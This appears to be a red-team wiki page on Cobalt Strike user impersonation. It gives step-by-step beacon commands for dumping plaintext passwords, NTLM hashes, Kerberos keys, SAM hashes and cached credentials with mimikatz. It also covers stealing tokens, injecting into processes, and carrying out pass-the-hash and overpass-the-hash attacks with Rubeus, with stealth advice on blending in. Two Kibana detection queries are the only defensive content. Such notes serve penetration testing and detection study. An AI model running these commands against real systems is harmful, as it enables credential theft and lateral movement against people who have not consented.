# Cobalt Strike User Impersonation

---

## Dump Plaintext Passwords and NTLM Hashes of Logged On Users

- Must be executed in the user context of a local administrator
- To retrieve plaintext passwords, `wdigest` must be enabled (it is disabled by default in Windows 10)
- Leverage NTLM hashes in a [[cobalt-strike-user-impersonation#Pass the Hash|Pass the Hash attack]]
	- Note that [[cobalt-strike-user-impersonation#Dump Kerberos Encryption Keys of Logged On Users|Kerberos encryption keys]] and [[cobalt-strike-user-impersonation#Overpass the Hash|Overpass the Hash attacks]] are significantly stealther
- These credentials are automatically saved in Cobalt Strike's credential data model (`Views` --> `Credentials`)

```beacon
mimikatz sekurlsa::logonpasswords
```

```beacon
logonpasswords
```

---

## Dump Kerberos Encryption Keys of Logged On Users

- The AES 128 (if available) and 256 keys are what you want
- Leverage these in an [[cobalt-strike-user-impersonation#Overpass the Hash|Overpass the Hash attack]], which is significantly stealthier than a [[cobalt-strike-user-impersonation#Pass the Hash|Pass the Hash attack]]
- These credentials are **not** automatically saved in Cobalt Strike's credential data model, but can be added manually (`View` --> `Credentials` --> `Add`)

```beacon
mimikatz sekurlsa::ekeys
```

---

## Dump Kerberos Tickets of Logged On Users

- Tickets returned depends on current privilege level
	- Unelevated returns only your tickets, elevated returns all
- Leverage these in the latter part of an [[cobalt-strike-user-impersonation#Overpass the Hash|Overpass the Hash attack]]
- See [[rubeus|Rubeus]]

1. [[rubeus#List All Accessible Kerberos Tickets|List all accessible Kerberos tickets]]

- Note the logon unique ID (`Current LUID`) and [[service-principal-name|SPN]] (`Service`)
	- `krbtgt/$DOMAIN` is the SPN of a TGT

2. [[rubeus#Dump an Accessible Kerberos Ticket|Dump the target Kerberos ticket]]

3. If unelevated, leverage the resultant ticket in the latter part of the [[cobalt-strike-user-impersonation#Unelevated|unelevated]] Overpass the Hash technique. Otherwise, [[rubeus#Spawn New Process within New Logon Session|spawn a new process within a new logon session]]

- `$PATH_TO_PROGRAM` should be a program that will continue running once executed, like `cmd.exe`
- Note the resultant process' logon session ID (LUID) and PID

4. [[rubeus#Inject Kerberos Ticket into Logon Session|Inject the ticket into the new process]]

5. [[cobalt-strike-user-impersonation#Steal Token from Process|Steal the process' token]]

---

## Dump Local User NTLM Hashes from Security Accounts Manager (SAM)

- Must be executed in the user context of a local administrator
- Leverage NTLM hashes in a [[cobalt-strike-user-impersonation#Pass the Hash|Pass the Hash attack]]
	- Note that [[cobalt-strike-user-impersonation#Dump Kerberos Encryption Keys of Logged On Users|Kerberos encryption keys]] and [[cobalt-strike-user-impersonation#Overpass the Hash|Overpass the Hash attacks]] are significantly stealther

```beacon
mimikatz lsadump::sam
```

---

## Dump Domain Cached Credentials

- Must be executed in the user context of a local administrator

```beacon
mimikatz lsadump::cache
```

- Note the iterations `* Iteration is set to ...`
- Note each username and hash
- Crack resultant DCC2 hashes with [[hashcat#Crack Windows Active Directory Domain Cached Credential DCC Hash|hashcat]]

---

## Make Token with Credential

- Doesn't require local administrator
- New token only used for network actions, not local
- Use `rev2self` to revert to previous token
- Generates event ID 4624 with logon type 9

```beacon
make_token $DOMAIN\$USERNAME $PASSWORD
```

---

## Steal Token from Process

- Requires local administrator if process isn't owned by current user
- New token only used for network actions, not local
- Use `rev2self` to revert to previous token

```beacon
steal_token $PID
```

---

## Process Injection

- Requires local administrator if process isn't owned by current user
- Resultant beacon's token good for both local and network actions
- Especially useful for **process migration**

```beacon
inject $PID $ARCHITECTURE $LISTENER
```

---

## Spawn New Beacon with Credential

- Doesn't require local administrator
- Resultant beacon's token good for both local and network actions
- Generates event ID 4624 with logon type 2
- If user's profile wasn't already on machine, this adds it

```beacon
spawnas $DOMAIN\$USERNAME $PASSWORD $LISTENER
```

---

## Pass the Hash

- Requires local administrator
- Involves the patching of LSASS, which is easily detectable
- HIGH RISK
- [[cobalt-strike-user-impersonation#Overpass the Hash|Overpass the Hash]] is significantly stealthier

### Technique #1: Token over Named Pipe

```beacon
pth $DOMAIN\$USERNAME $NTLM
```

This command does the following:

1. Create fake, sacrificial logon session
2. Replace the logon session's information with the target user's domain, username, and NTLM hash
3. Executes a command in the logon session to write its token to a named pipe
	- Something like `cmd.exe \c "echo 1cbe909fe8a > \\.\pipe\16ca6d"`
4. Reads the token from the named pipe
5. Impersonates the token
6. Kills the sacrificial logon session

#### Kibana Query

- Find the process that wrote the token to the named pipe and note the user who executed it

```kql
event.module: sysmon and event.type: process_start and process.name: cmd.exe and process.command_line: *\\\\.\\pipe\\*
```

- Find the logon session of the above user

```kql
event.code: 4624 and winlog.logon.id: 0xe6d64
```

### Technique #2: Spawning a Process and Stealing its Token

1. Create a fake sacrificial logon session
2. Replace the logon session's information with the domain, username, and NTLM hash of the target user
3. Within that logon session, run `$ANY_PROGRAM_TO_RUN`
	- Note the resultant `$PROCESS_ID`

```beacon
mimikatz sekurlsa::pth /domain:$DOMAIN /user:$USERNAME /ntlm:$NTLM /run:$ANY_PROGRAM_TO_RUN
```

4. Steal the token of the resultant process

```beacon
steal_token $PROCESS_ID
```

5. When finished, revert to your previous token and kill the process

```beacon
rev2self
kill $PROCESS_ID
```

---

## Overpass the Hash

Also known as [[pass-the-ticket|Pass the Ticket (PTT)]].

### Unelevated

1. Use the target user's [[cobalt-strike-user-impersonation#Dump Kerberos Encryption Keys of Logged On Users|Kerberos encryption key]] to request a Ticket Granting Ticket (TGT) for the target user
	- AES 128, AES 256, and RC4 (NTLM) keys can be used
		- However, Windows uses AES 256 keys by default, so you should too to blend in
	- See [[rubeus|Rubeus]]
	- Save the TGT to disk on the attacking machine

```beacon
execute-assembly $PATH_TO_RUBEUS asktgt /domain:$DOMAIN /user:$USER /aes256:$AES_256_KEY /nowrap /opsec
```

2. Create a new local logon session
	- This is because each logon session can only have one TGT at a time

```beacon
make_token $DOMAIN\$USER $DUMMY_PASSWORD
```

3. Inject the TGT into the logon session

```beacon
kerberos_ticket_use $PATH_TO_TGT_ON_ATTACKING_MACHINE
```

5. Leverage the logon session to interact with the target resource

### Elevated

1. Use the target user's [[cobalt-strike-user-impersonation#Dump Kerberos Encryption Keys of Logged On Users|Kerberos encryption key]] to request a Ticket Granting Ticket (TGT) for the target user and spawn a `cmd.exe` process
	- AES 128, AES 256, and RC4 (NTLM) keys can be used
		- However, Windows uses AES 256 keys by default, so you should too to blend in
	- See [[rubeus|Rubeus]]
	- Note the `cmd.exe` process's PID

```beacon
execute-assembly $PATH_TO_RUBEUS asktgt /domain:$DOMAIN /user:$USER /aes256:$AES_256_KEY /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
```

2. Steal the `cmd.exe` process's PID

```beacon
steal_token $PID
```
